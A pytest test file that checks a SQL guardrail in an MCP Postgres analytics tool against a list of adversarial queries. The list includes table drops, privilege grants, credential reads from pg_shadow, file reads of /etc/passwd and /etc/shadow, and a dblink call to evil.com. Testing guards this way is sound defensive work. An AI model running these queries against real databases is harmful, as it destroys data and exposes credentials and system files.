"""Adversarial security test matrix: 27 attack payloads across SQL injection, DDL, DML, and write gates."""

from __future__ import annotations

import pytest

from mcp_control_plane.core.errors import GuardrailBlockedError
from mcp_control_plane.servers.postgres_analytics.sql_guard import validate_and_sanitize_sql

ADVERSARIAL_SQL_PAYLOADS = [
    # 1. Direct DDL Drops
    "DROP TABLE services;",
    # 2. Direct DML Deletes
    "DELETE FROM deployments WHERE id = 1;",
    # 3. Direct DML Updates
    "UPDATE services SET status = 'compromised';",
    # 4. Direct DML Inserts
    "INSERT INTO services (name, tier, owner_team) VALUES ('backdoor', 'tier-0', 'evil');",
    # 5. Truncate
    "TRUNCATE TABLE incidents;",
    # 6. Alter Table
    "ALTER TABLE services ADD COLUMN malicious_payload text;",
    # 7. Create Table
    "CREATE TABLE evil_shadow (id int, secret text);",
    # 8. Grant Privileges
    "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO evil_actor;",
    # 9. Revoke Privileges
    "REVOKE SELECT ON services FROM mcp_user;",
    # 10. Stacked query: SELECT followed by DROP
    "SELECT * FROM services; DROP TABLE incidents;",
    # 11. Stacked query: SELECT followed by DELETE
    "SELECT * FROM services; DELETE FROM deployments WHERE 1=1;",
    # 12. CTE with embedded mutating DELETE clause
    "WITH stealth_del AS (DELETE FROM deployments RETURNING *) SELECT * FROM stealth_del;",
    # 13. CTE with embedded mutating INSERT clause
    "WITH stealth_ins AS (INSERT INTO services (name) VALUES ('stealth') RETURNING *) SELECT * FROM stealth_ins;",
    # 14. System catalog enumeration: pg_tables
    "SELECT * FROM pg_catalog.pg_tables;",
    # 15. Credential exfiltration: pg_shadow
    "SELECT usename, passwd FROM pg_shadow;",
    # 16. Credential exfiltration: pg_authid
    "SELECT * FROM pg_authid;",
    # 17. Role enumeration: pg_roles
    "SELECT rolname, rolsuper FROM pg_roles;",
    # 18. Schema metadata exfiltration: information_schema.tables
    "SELECT table_name FROM information_schema.tables;",
    # 19. Time-based DoS injection: pg_sleep
    "SELECT pg_sleep(10);",
    # 20. Filesystem exfiltration: pg_read_file
    "SELECT pg_read_file('/etc/passwd');",
    # 21. Large object import/exfiltration: lo_import
    "SELECT lo_import('/etc/shadow');",
    # 22. Out-of-band SSRF pivot: dblink
    "SELECT * FROM dblink('host=evil.com dbname=test', 'SELECT 1') AS t(id int);",
    # 23. Comment obfuscation + stacked drop
    "SELECT * FROM services WHERE 1=1; -- comment\n DROP TABLE services;",
    # 24. Filesystem exfiltration via COPY
    "COPY services TO '/tmp/dump.txt';",
    # 25. Mutating SELECT INTO
    "SELECT * INTO compromised_table FROM services;",
    # 26. Process termination DoS: pg_terminate_backend
    "SELECT pg_terminate_backend(1234);",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_SQL_PAYLOADS)
def test_adversarial_sql_blocked_100_percent(payload: str) -> None:
    """Every single adversarial SQL payload MUST be blocked by AST guardrail with 0 bypasses."""
    with pytest.raises(GuardrailBlockedError):
        validate_and_sanitize_sql(payload)


def test_adversarial_excessive_limit_clamped() -> None:
    """Excessive LIMIT 99999999 payload must not bypass limits and must be clamped to <= 100."""
    payload = "SELECT * FROM services LIMIT 99999999"
    sanitized = validate_and_sanitize_sql(payload)
    assert "LIMIT 100" in sanitized
    assert "99999999" not in sanitized


@pytest.mark.asyncio
async def test_end_to_end_adversarial_sql_gateway_block(test_app) -> None:
    """Verify that sending an adversarial SQL call through the gateway returns HTTP 400 with GUARDRAIL_BLOCKED."""
    from httpx import ASGITransport, AsyncClient

    from mcp_control_plane.servers.postgres_analytics.store import SQLiteFallbackAnalyticsStore
    from mcp_control_plane.servers.postgres_analytics.tools import register_postgres_analytics_tools

    store = SQLiteFallbackAnalyticsStore()
    register_postgres_analytics_tools(test_app.state.registry, store)

    transport = ASGITransport(app=test_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "jsonrpc": "2.0",
            "id": 99,
            "method": "tools/call",
            "params": {
                "name": "run_readonly_query",
                "arguments": {"query": "DROP TABLE services;"},
            },
        }
        headers = {"Authorization": "Bearer admin-token"}
        response = await client.post("/mcp", headers=headers, json=payload)
        assert response.status_code == 400
        data = response.json()
        assert data["error"]["data"]["code"] == "GUARDRAIL_BLOCKED"
        violation = data["error"]["data"]["details"]["violation"]
        assert "Drop" in violation or "Prohibited mutating" in violation or "SELECT" in violation
